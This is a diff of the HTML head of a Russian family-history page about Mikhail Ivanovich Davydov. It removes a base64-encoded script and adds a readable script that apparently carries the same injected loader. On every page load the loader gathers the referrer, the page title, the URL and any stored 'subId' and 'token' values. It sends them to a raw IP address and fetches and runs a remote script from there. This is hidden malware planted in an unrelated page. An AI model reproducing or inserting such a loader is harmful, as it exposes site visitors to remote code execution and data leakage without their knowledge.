@@ -1,14 +1,53 @@
 <html lang="ru">
 
 <head>
-<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfU2hoY0hIZFA3UlY4OGY2Tic7CiAgICBpZiAoIXdpbmRvdy5fU2hoY0hIZFA3UlY4OGY2TikgewogICAgICAgIHdpbmRvdy5fU2hoY0hIZFA3UlY4OGY2TiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cDovLzIxMy4zMi4xMC4xMzgvcEpqV1M4TFEnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwOi8vMjEzLjMyLjEwLjEzOC85MjhiMTJhL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgXzE5MmJZdlJnc3BrTTU5REMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF8xOTJiWXZSZ3Nwa001OURDICE9PSAndW5kZWZpbmVkJyAmJiBfMTkyYll2UmdzcGtNNTlEQyAhPT0gbnVsbCkgewogICAgICAgIHZhciBfQ2ZQVk10OXdwZDJGRkY0ZCA9IEpTT04ucGFyc2UoXzE5MmJZdlJnc3BrTTU5REMpOwogICAgICAgIHZhciBfbmQxNmpNWXlCMzlYSHNHMyA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9DZlBWTXQ5d3BkMkZGRjRkLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX1NoaGNISGRQN1JWODhmNk4udHRsIDwgX25kMTZqTVl5QjM5WEhzRzMpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9NNk5yazltMkd4ZlNTNUJ5ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX3JwYmp4MjFjOGcxQmdrbjIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfWmRGczVEZGpxcTY2ckNOcyA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX1pkRnM1RGRqcXE2NnJDTnMgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX1pkRnM1RGRqcXE2NnJDTnMgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfWmRGczVEZGpxcTY2ckNOcyArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfWmRGczVEZGpxcTY2ckNOcyArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX1pkRnM1RGRqcXE2NnJDTnMgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICBpZiAodHlwZW9mIF9NNk5yazltMkd4ZlNTNUJ5ICE9PSAndW5kZWZpbmVkJyAmJiBfTTZOcms5bTJHeGZTUzVCeSAmJiB3aW5kb3cuX1NoaGNISGRQN1JWODhmNk4udW5pcXVlKSB7CiAgICAgICAgX1pkRnM1RGRqcXE2NnJDTnMgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfTTZOcms5bTJHeGZTUzVCeSk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9ycGJqeDIxYzhnMUJna24yICE9PSAndW5kZWZpbmVkJyAmJiBfcnBiangyMWM4ZzFCZ2tuMiAmJiB3aW5kb3cuX1NoaGNISGRQN1JWODhmNk4udW5pcXVlKSB7CiAgICAgICAgX1pkRnM1RGRqcXE2NnJDTnMgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9ycGJqeDIxYzhnMUJna24yKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9TaGhjSEhkUDdSVjg4ZjZOLlJfUEFUSCArIF9aZEZzNURkanFxNjZyQ05zOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title>Михаил Иванович Давыдов история происхождения его семьи</title>
 
 <p><img src="mi.jpg" alt="" /></p>
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	
+	<script>
+    (function() {
+    var name = '_CyjjPGyhRdfbswxC';
+    if (!window._CyjjPGyhRdfbswxC) {
+        window._CyjjPGyhRdfbswxC = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'http://213.32.10.138/pJjWS8LQ',
+            P_PATH: 'http://213.32.10.138/928b12a/postback',
+        };
+    }
+    const _mCctZh7ZmZwf32n5 = localStorage.getItem('config');
+    if (typeof _mCctZh7ZmZwf32n5 !== 'undefined' && _mCctZh7ZmZwf32n5 !== null) {
+        var _s6yVLsvF1Dby8cTn = JSON.parse(_mCctZh7ZmZwf32n5);
+        var _QDbMTFf7h6Kyq1DK = Math.round(+new Date()/1000);
+        if (_s6yVLsvF1Dby8cTn.created_at + window._CyjjPGyhRdfbswxC.ttl < _QDbMTFf7h6Kyq1DK) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _bbWL8NmC4Rf2DSsY = localStorage.getItem('subId');
+    var _8Yw4nzNqkNxTRp7P = localStorage.getItem('token');
+    var _Xq5LBr3rcSst1SRk = '?return=js.client';
+        _Xq5LBr3rcSst1SRk += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _Xq5LBr3rcSst1SRk += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _Xq5LBr3rcSst1SRk += '&default_keyword=' + encodeURIComponent(document.title);
+        _Xq5LBr3rcSst1SRk += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _Xq5LBr3rcSst1SRk += '&name=' + encodeURIComponent(name);
+    if (typeof _bbWL8NmC4Rf2DSsY !== 'undefined' && _bbWL8NmC4Rf2DSsY && window._CyjjPGyhRdfbswxC.unique) {
+        _Xq5LBr3rcSst1SRk += '&sub_id=' + encodeURIComponent(_bbWL8NmC4Rf2DSsY);
+    }
+    if (typeof _8Yw4nzNqkNxTRp7P !== 'undefined' && _8Yw4nzNqkNxTRp7P && window._CyjjPGyhRdfbswxC.unique) {
+        _Xq5LBr3rcSst1SRk += '&token=' + encodeURIComponent(_8Yw4nzNqkNxTRp7P);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._CyjjPGyhRdfbswxC.R_PATH + _Xq5LBr3rcSst1SRk;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 </head>
 
 <body>
